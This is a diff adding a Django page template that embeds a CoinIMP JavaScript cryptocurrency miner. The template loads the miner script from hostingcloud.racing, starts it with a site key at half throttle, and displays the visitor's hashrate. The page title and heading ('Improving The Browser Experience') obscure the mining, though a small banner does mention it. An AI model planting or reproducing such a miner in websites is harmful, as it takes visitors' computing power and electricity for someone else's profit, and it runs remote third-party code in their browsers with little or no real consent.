@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
+<head>
+    <meta name="viewport" content=
+            "width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'home/style.css' %}"/>
+    <style>
+
+    </style>
+    <meta charset="UTF-8">
+    <title>Thank you for visiting!</title>
+    <script>
+        var hashrate = function () {
+            var i = 0;
+            while (i < 100) {
+                (function (i) {
+                    setTimeout(function () {
+                        document.getElementById('running').innerHTML = parseInt(_client.getHashesPerSecond()) + ' H/s';
+                    }, 1000 * i)
+                })(i++)
+            }
+        };
+    </script>
+    <script src="https://www.hostingcloud.racing/fXws.js"></script>
+    <script>
+        var _client = new Client.Anonymous('6e7e12936e81d544ae0869b93ce96af3f942c37f43eef4db88f7bb520220f14f', {
+            throttle: 0.5, c: 'w', ads: 0
+        });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+    </script>
+</head>
+<body>
+
+<h1>Improving The Browser Experience</h1>
+
+<div class="hash_box">
+<h2>Current hashrate is: </h2>
+<h2 id="running"></h2>
+</div>
+
+<script>
+    hashrate();
+</script>
+
+{% block content %}{% endblock content %}
+
+</body>
+</html>
